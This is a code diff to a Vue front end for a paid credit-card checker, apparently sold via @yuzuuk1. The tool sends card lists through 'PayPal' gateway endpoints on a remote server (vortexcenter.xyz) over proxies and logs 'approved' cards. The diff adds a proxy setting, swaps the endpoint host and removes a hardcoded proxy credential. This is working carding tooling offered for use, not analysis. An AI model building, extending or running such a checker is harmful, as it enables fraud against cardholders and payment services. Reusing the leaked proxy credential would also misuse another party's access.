@@ -276,6 +276,15 @@
                                 </div>
                             </div>
 
+                            <div>
+                                <label class="block text-white/80 font-bold text-sm mb-2">Proxy</label>
+                                <input v-model="settings.proxy"
+                                    placeholder="proxy.oculus-proxy.com:31112:username:password" class="w-full rounded-2xl px-4 py-3 bg-black/25 border border-white/10 text-white outline-none
+                                focus:border-white/20 focus:ring-2 focus:ring-[#7aa7ff]/25 transition" />
+                                <div class="text-white/50 text-xs mt-2">Proxy used by gateway requests. Example shown.
+                                </div>
+                            </div>
+
 
                             <!-- Threads -->
                             <div>
@@ -383,7 +392,8 @@
                             <h2 class="text-xl font-black text-white text-center">You don't have access to this checker!
                             </h2>
                             <p class="text-white/60 text-center text-sm">
-                                You need to purchase with <span class="text-rose-300 font-bold">@yuzuuk1</span> to use this
+                                You need to purchase with <span class="text-rose-300 font-bold">@yuzuuk1</span> to use
+                                this
                                 checker.
                             </p>
 
@@ -433,6 +443,7 @@ const settings = ref({
     threads: 1,
     gateway: 'PayPal US',
     approvedLog: false,
+    proxy: ''
 })
 
 const hideApproved = ref(false)
@@ -449,8 +460,6 @@ const apiMap = {
     'PayPal CA': 'ca',
     'PayPal BR': 'bra'
 }
-
-const proxyValue = 'proxy.oculus-proxy.com:31112:oc-84314131dbfccdae1fc4dd104d5b8263adf35c1d114192ee88158d68e8583cf0:m64922lkgp26'
 
 // Load settings
 if (typeof window !== 'undefined') {
@@ -579,10 +588,10 @@ async function startCheck() {
 
             // escolhe qual endpoint .php usar conforme gateway selecionado
             const api = apiMap[settings.value.gateway] || 'bra'
-            const url = `http://181.41.201.20/${api}.php`
+            const url = `https://vortexcenter.xyz/butico/${api}.php`
 
             // corpo application/x-www-form-urlencoded: proxy=<...>&lista=<card>
-            const body = new URLSearchParams({ proxy: proxyValue, lista: card }).toString()
+            const body = new URLSearchParams({ proxy: settings.value.proxy || '', lista: card }).toString()
 
             const res = await fetch(url, {
                 method: 'POST',
